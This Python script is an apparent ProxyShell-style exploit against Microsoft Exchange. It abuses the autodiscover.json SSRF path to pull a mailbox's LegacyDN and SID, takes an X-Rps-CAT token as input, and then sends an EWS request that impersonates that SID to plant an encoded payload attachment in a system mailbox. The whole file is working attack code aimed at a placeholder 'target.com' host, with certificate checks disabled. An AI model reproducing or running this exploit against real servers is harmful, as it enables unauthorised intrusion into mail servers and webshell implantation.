import urllib2
import urllib
import httplib
import sys
import base64
import os
import ssl
import json
from impacket import ntlm
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from requests.packages.urllib3.exceptions import InsecureRequestWarning

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

EMAIL = "SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@target.com"
HOST = "https://target.com"
SID = ""
DEBUG = False


rand_email = 'rand@mm.com'
URL = HOST + "/autodiscover/autodiscover.json?a="+rand_email+"/autodiscover/autodiscover.xml/"


autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
            <Request>
              <EMailAddress>{EMAIL}</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
            </Request>
        </Autodiscover>
        """.replace('{EMAIL}',EMAIL)

r = urllib2.Request(URL,data=autoDiscoverBody,headers={'Content-Type': 'text/xml',
                                        'Cookie':'Email=autodiscover/autodiscover.json?a='+rand_email,
                                        'User-Agent': 'ExchangeServicesClient/0.0.0.0',
                                        'msExchLogonMailbox': 'S-1-5-20',
                                                             })


            
try:
    r = urllib2.urlopen(r,context=ctx)
    datadn = r.read()
    print(datadn )
    print(r.info())
except Exception as e:
    print(e.read())
    print(e.info())
    print(e)
legacyDn = str(datadn).split("<LegacyDN>")[1]
legacyDn = legacyDn.split("</LegacyDN>")[0]
print(legacyDn)

URL = HOST + "/autodiscover/autodiscover.json?a="+rand_email+"/mapi/emsmdb?MailboxId=6583fe51-aaaa-aaaa-aaaa-5afb512c2c2a@test.com"

mapi_body = legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
r = urllib2.Request(URL,data=mapi_body,headers={
                                                         'User-Agent': 'ExchangeServicesClient/0.0.0.0',
                                                         'Cookie':'Email=autodiscover/autodiscover.json?a='+rand_email,
                                                         
                                                        "Content-Type": "application/mapi-http",
                                                        "X-RequestId": "5b8cd8f9-9a64-490d-8f0a-713c6cf078c9:1",
                                                        "X-RequestType": "Connect",
                                                        "X-ClientApplication": "MapiHttpClient/15.1.225.37",
                                                         'msExchLogonMailbox': 'S-1-5-20',
                                                         })
        
        
try:
    r = urllib2.urlopen(r,context=ctx)

    DDATA = r.read()
    if(DEBUG):
        print(DDATA)
    SID_OK = str(DDATA).split("with SID ")[1].split(" and MasterAccountSid")[0]
    print(r.code)
    print(SID_OK)
except Exception as e:
    print(e)

TOKEN = raw_input("Token> ").strip()
TOKEN = urllib.quote(TOKEN)
    
data = """
    <soap:Envelope
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2016" />
    <t:SerializedSecurityContext>
      <t:UserSid>{SID}</t:UserSid>
      <t:GroupSids>
        <t:GroupIdentifier>
          <t:SecurityIdentifier>S-1-5-21</t:SecurityIdentifier>
        </t:GroupIdentifier>
      </t:GroupSids>
    </t:SerializedSecurityContext>
  </soap:Header>
  <soap:Body>
    <m:CreateItem MessageDisposition="SaveOnly">
      <m:Items>
        <t:Message>
          <t:Subject>{SUBJ}</t:Subject>
          <t:Body BodyType="HTML">hello from darkness side</t:Body>
          <t:Attachments>
            <t:FileAttachment>
              <t:Name>FileAttachment.txt</t:Name>
              <t:IsInline>false</t:IsInline>
              <t:IsContactPhoto>false</t:IsContactPhoto>
              <t:Content>{PAY}</t:Content>
            </t:FileAttachment>
          </t:Attachments>
          <t:ToRecipients>
            <t:Mailbox>
              <t:EmailAddress>{EMAIL}</t:EmailAddress>
            </t:Mailbox>
          </t:ToRecipients>
        </t:Message>
      </m:Items>
    </m:CreateItem>
  </soap:Body>
</soap:Envelope>
    """.replace('{SUBJ}','TESTSUB12').replace('{EMAIL}',EMAIL).replace('{SID}',SID)


payload = "lfYm2TuDvtJEZ9KV+/Ym2dIoxWfFZzuDvtJEZ9KV1lSGt2kUOc2pBt/3qd/a/5ZhZ1SGt2kUljmG9wapFP+W1tqGpdqGltld9wZUFLfTBjm5qd/aKSDTqQ2MyemlqYY5qf++2lz32tYUfpa+REOWDzFd04aMpamGObf/jzG3lZGPjzG3SkrJ6an/qfOG2mnNqVTajJZFlmuWlskxITHapanNjKnJMSGV+9ZUhrdpFNkA"

data = data.replace('{PAY}',payload)
URL = HOST + "/autodiscover/autodiscover.json?a="+rand_email+"/EWS/exchange.asmx/?X-Rps-CAT="+TOKEN

r = urllib2.Request(URL,data=data,headers={
                                                        'Content-Type': 'text/xml',
                                                         'User-Agent': 'ExchangeServicesClient/0.0.0.0',
                                                         'Cookie':'Email=autodiscover/autodiscover.json?a='+rand_email,


                                                         })
        
        
try:
    r = urllib2.urlopen(r,context=ctx)

    print(r.read())

except Exception as e:
    print(e.read())

